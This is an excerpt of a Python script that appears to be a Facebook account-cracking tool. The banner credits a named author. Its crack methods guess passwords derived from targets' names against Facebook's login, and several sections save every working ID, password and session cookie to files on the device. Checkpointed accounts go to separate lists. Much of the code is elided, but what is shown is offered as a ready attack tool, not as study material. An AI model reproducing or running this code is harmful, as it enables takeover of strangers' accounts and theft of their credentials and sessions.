...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            SAMARPAN JABEGU
\033[1;37m Facebook:         SAMARPAN JABEGU LIMBU
\033[1;37m Github  :             S4M4RP4N
...
def sarfraz():   
    ...
    if select =='1':
       ...
       menu()
        ...
        os.system('xdg-open https://www.facebook.com/samarpan.limbu.')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SAMAR] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SAMAR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SANAR_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SAMAR_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SAMAR-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SAMAR_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SAMAR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SAMAR_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SAMAR_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SAMAR-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SAMAR] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    #  print(f"\r{A} [SAMAR-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SAMAR-CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SAMAR] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    oks.append(sid)
                    open('/sdcard/SAMAR_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
...
def p_dump():
    ...
    try:
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back SAMAR Menu ")
        SSB(allkey)
    except Exception as e:
        print("Error : %s"%e) 
...
def cutter():
    ...
    sarfraz = input('Saving Put File Name:')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+samar+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + samar )
    print("New File Saved:" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back SAMAR Menu ")
    SSB(allkey)       
